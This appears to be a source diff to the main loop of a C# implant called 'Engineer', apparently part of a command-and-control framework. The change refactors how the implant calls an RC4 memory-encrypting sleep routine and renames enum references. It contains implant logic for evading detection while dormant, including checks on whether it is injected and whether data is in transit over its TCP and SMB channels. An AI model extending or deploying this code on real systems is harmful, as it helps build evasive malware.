@@ -1,4 +1,5 @@
-﻿using DynamicEngLoading;
+﻿using System;
+using DynamicEngLoading;
 using Engineer.Commands;
 using Engineer.Functions;
 using Engineer.Models;
@@ -42,7 +43,7 @@ namespace Engineer
         public static string MetadataKey = "{{REPLACE_METADATA_KEY}}";
         public static int P2PNumber = int.TryParse("{{REPLACE_P2P_NUMBER}}", out P2PNumber) ? P2PNumber : -1;
         public static bool IsTaskExecuting = false;
-        public static SleepEnum.SleepTypes Sleeptype = Enum.TryParse("{{REPLACE_SLEEP_TYPE}}", out SleepEnum.SleepTypes sleeptype) ? sleeptype : SleepEnum.SleepTypes.None;
+        public static SleepTypes Sleeptype = Enum.TryParse("{{REPLACE_SLEEP_TYPE}}", out SleepTypes sleeptype) ? sleeptype : SleepTypes.None;
         public static DateTime LastP2PCheckIn = DateTime.Now;
         public static string ImplantType = "{{REPLACE_IMPLANT_TYPE}}";
         public static DateTime killDate = DateTime.TryParse("{{REPLACE_KILL_DATE}}", out killDate) ? killDate : DateTime.MaxValue;
@@ -217,27 +218,11 @@ namespace Engineer
                         else if (!(IsTaskExecuting) && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                         {
                             IsEncrypted = true;
-                            if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
+                            if (Sleeptype == SleepTypes.Custom_RC4)
                             {
-                                //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
-                                if (typesWithModuleAttribute.Where(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)).Count() > 0)
-                                {
-                                    //Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
-                                    var sleepEncryptModule = typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt",StringComparison.OrdinalIgnoreCase));
-                                    // Get the method
-                                    var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
-                                    if (method != null)
-                                    {
-                                        // Call the method , first argument is null because it's a static method
-                                        method.Invoke(null,new object[] { EngCommBase.Sleep });
-                                    }
-                                }
-                                else
-                                {
-                                    Thread.Sleep(EngCommBase.Sleep);
-                                }
+                                Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
                             }
-                            else if(Sleeptype == SleepEnum.SleepTypes.None)
+                            else if(Sleeptype == SleepTypes.None)
                             {
                                 Thread.Sleep(EngCommBase.Sleep);
                             }
@@ -275,11 +260,11 @@ namespace Engineer
                         //         //while the current hour is not the start hour sleep
                         //         while (DateTime.UtcNow.Minute != startHours.Minute)
                         //         {
-                        //             if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
+                        //             if (Sleeptype == SleepTypes.Custom_RC4)
                         //             {
                         //                 Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
                         //             }
-                        //             else if (Sleeptype == SleepEnum.SleepTypes.None)
+                        //             else if (Sleeptype == SleepTypes.None)
                         //             {
                         //                 Thread.Sleep(EngCommBase.Sleep);
                         //             }
